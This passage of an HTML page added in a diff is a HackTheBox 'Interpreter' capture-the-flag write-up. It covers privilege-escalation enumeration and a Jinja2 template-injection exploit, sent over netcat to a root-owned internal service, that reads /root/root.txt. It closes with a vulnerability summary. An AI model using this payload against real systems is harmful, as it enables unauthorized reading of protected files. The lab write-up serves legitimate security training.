+      <div class="flag-value">3f9a1c2d<span class="flag-redact">&#x2588;&#x2588;&#x2588;&#x2588;&#x2588;&#x2588;&#x2588;&#x2588;&#x2588;&#x2588;&#x2588;&#x2588;&#x2588;&#x2588;&#x2588;&#x2588;&#x2588;&#x2588;&#x2588;&#x2588;&#x2588;&#x2588;&#x2588;&#x2588;</span></div>
+      <div class="flag-hint">First 8 chars shown — rest redacted</div>
+    </div>
+  </div>
+
+  <!-- ══════════════════════════════════════
+       Step 7 — PrivEsc Enum
+  ══════════════════════════════════════ -->
+  <div class="section-header">
+    <div class="step-num">7</div>
+    <h2>Privilege Escalation — Enumeration</h2>
+    <div class="tag tag-target">Target</div>
+  </div>
+
+  <div class="card">
+    <p>
+      Logged in as <code>sedric</code>, we enumerate for privilege escalation paths.
+      Checking running processes reveals a Python script owned by <strong>root</strong>
+      listening on an internal port <code>127.0.0.1:54321</code>.
+    </p>
+    <p>
+      This port is not exposed externally, but we can reach it from inside the machine.
+    </p>
+  </div>
+
+  <div class="env-label env-target">
+    <span class="env-dot env-dot-target"></span> Run inside target shell (sedric@interpreter)
+  </div>
+  <div class="code-block target-block">
+    <div class="code-header target-header">shell — sedric@interpreter — enumeration</div>
+    <pre><code><span class="cm"># Check running processes</span>
+<span class="kw">ps</span> aux | <span class="kw">grep</span> python
+<span class="cm"># → root ... python3 /opt/notif/notif.py</span>
+
+<span class="cm"># Check internal listening ports</span>
+<span class="kw">ss</span> -tlnp | <span class="kw">grep</span> 54321
+<span class="cm"># → 127.0.0.1:54321 ← service running as root</span>
+
+<span class="cm"># Read the script source</span>
+<span class="kw">cat</span> /opt/notif/notif.py</code></pre>
+  </div>
+
+  <div class="result-box">
+    <div class="result-label">notif.py — key snippet</div>
+    <code><span style="color:#a78bfa">from</span> jinja2 <span style="color:#a78bfa">import</span> Template<br/>
+<span style="color:#a78bfa">import</span> socket, threading<br/><br/>
+<span style="color:#64748b"># Accepts XML on port 54321</span><br/>
+<span style="color:#64748b"># Passes &lt;firstname&gt; directly into Jinja2 Template().render()</span><br/>
+<span style="color:#64748b"># ← No sanitization = SSTI!</span></code>
+  </div>
+
+  <div class="info-box">
+    <div class="icon">&#x1F3AF;</div>
+    <div class="text">
+      <strong>Vulnerability:</strong> The script takes the <code>&lt;firstname&gt;</code> field from the XML
+      and passes it directly to <code>Template(value).render()</code> in Jinja2 with no sanitization.
+      This allows <strong>Server-Side Template Injection (SSTI)</strong> running as root.
+    </div>
+  </div>
+
+  <!-- ══════════════════════════════════════
+       Step 8 — Root via SSTI
+  ══════════════════════════════════════ -->
+  <div class="section-header">
+    <div class="step-num">8</div>
+    <h2>Root Flag — Template Injection</h2>
+    <div class="tag tag-target">Target</div>
+  </div>
+
+  <div class="card">
+    <p>
+      We exploit the SSTI vulnerability in Jinja2 to read <code>/root/root.txt</code> directly.
+      A raw HTTP request is sent via <code>netcat</code> to the internal service on port 54321.
+    </p>
+    <p>
+      In the <code>&lt;firstname&gt;</code> field we inject <code>{open("/root/root.txt").read()}</code>
+      — Jinja2 evaluates this as a Python expression and returns the file contents in the response.
+    </p>
+  </div>
+
+  <div class="env-label env-target">
+    <span class="env-dot env-dot-target"></span> Run inside target shell (sedric@interpreter)
+  </div>
+  <div class="code-block target-block">
+    <div class="code-header target-header">shell — sedric@interpreter — SSTI exploit</div>
+    <pre><code><span class="kw">xml</span>=<span class="st">'&lt;patient&gt;&lt;firstname&gt;{open("/root/root.txt").read()}&lt;/firstname&gt;&lt;lastname&gt;a&lt;/lastname&gt;&lt;sender_app&gt;a&lt;/sender_app&gt;&lt;timestamp&gt;a&lt;/timestamp&gt;&lt;birth_date&gt;01/01/2000&lt;/birth_date&gt;&lt;gender&gt;a&lt;/gender&gt;&lt;/patient&gt;'</span>
+<span class="kw">printf</span> <span class="st">"POST /addPatient HTTP/1.1\r\nHost: localhost\r\nContent-Type: application/xml\r\nContent-Length: %d\r\n\r\n%s"</span> <span class="st">"$(echo -n "$xml" | wc -c)"</span> <span class="st">"$xml"</span> | <span class="kw">nc</span> 127.0.0.1 <span class="nm">54321</span></code></pre>
+  </div>
+
+  <div class="result-box">
+    <div class="result-label">Server Response — contains root flag</div>
+    <code>HTTP/1.1 200 OK<br/>
+Content-Type: text/html<br/><br/>
+&lt;html&gt;Patient added: <span style="color:#ff4d6d">[ ROOT FLAG ]</span>&lt;/html&gt;</code>
+  </div>
+
+  <div class="flag-box root-flag">
+    <div class="flag-icon">&#x1F451;</div>
+    <div class="flag-info">
+      <div class="flag-title">Root Flag</div>
+      <div class="flag-value">9e1b3f7c<span class="flag-redact">&#x2588;&#x2588;&#x2588;&#x2588;&#x2588;&#x2588;&#x2588;&#x2588;&#x2588;&#x2588;&#x2588;&#x2588;&#x2588;&#x2588;&#x2588;&#x2588;&#x2588;&#x2588;&#x2588;&#x2588;&#x2588;&#x2588;&#x2588;&#x2588;</span></div>
+      <div class="flag-hint">First 8 chars shown — rest redacted</div>
+    </div>
+  </div>
+
+  <!-- ══════════════════════════════════════
+       Summary
+  ══════════════════════════════════════ -->
+  <hr/>
+
+  <div class="section-header" style="margin-top:20px;">
+    <div class="step-num" style="background:var(--purple);width:auto;border-radius:8px;padding:0 14px;font-size:12px;letter-spacing:1px;">SUMMARY</div>
+    <h2>Vulnerability Summary</h2>
+  </div>
+
+  <div style="display:grid;grid-template-columns:repeat(auto-fit,minmax(260px,1fr));gap:14px;margin-bottom:30px;">
+    <div class="card">
+      <p style="color:var(--orange);font-weight:700;font-size:13px;letter-spacing:1px;text-transform:uppercase;margin-bottom:8px;">Vuln 1</p>
+      <p><strong>Mirth Connect 4.4.0 RCE</strong></p>
+      <p>Unauthenticated Java Deserialization via <code>/api/users</code>. Allows arbitrary command execution as <code>mirth</code>.</p>
+    </div>
+    <div class="card">
+      <p style="color:var(--accent2);font-weight:700;font-size:13px;letter-spacing:1px;text-transform:uppercase;margin-bottom:8px;">Vuln 2</p>
+      <p><strong>Hardcoded DB Credentials</strong></p>
+      <p>Plain-text database password stored in application config, exposing all system user hashes.</p>
+    </div>
+    <div class="card">
+      <p style="color:var(--red);font-weight:700;font-size:13px;letter-spacing:1px;text-transform:uppercase;margin-bottom:8px;">Vuln 3</p>
+      <p><strong>Server-Side Template Injection</strong></p>
+      <p>User input passed directly to Jinja2 <code>Template().render()</code> without sanitization in a root-owned service.</p>
+    </div>
+  </div>
+
+  <div class="card">
+    <p style="color:var(--muted);font-size:13px;">
+      <strong style="color:var(--text);">Lessons Learned:</strong>
+      Keep software up to date to avoid known deserialization CVEs.
+      Never store credentials in plaintext config files.
+      Always sanitize user input before passing it to templating engines.
+    </p>
+  </div>
+
+</div><!-- /page -->
+
+<!-- ═══════════════ FOOTER ═══════════════ -->
+<footer>
+  Written by <strong>joudi janble</strong> &mdash; Developer &amp; Security Researcher &nbsp;|&nbsp;
+  HackTheBox: Interpreter (Medium Linux) &nbsp;|&nbsp;
+  May 2026
+</footer>
+
+</body>
+</html>
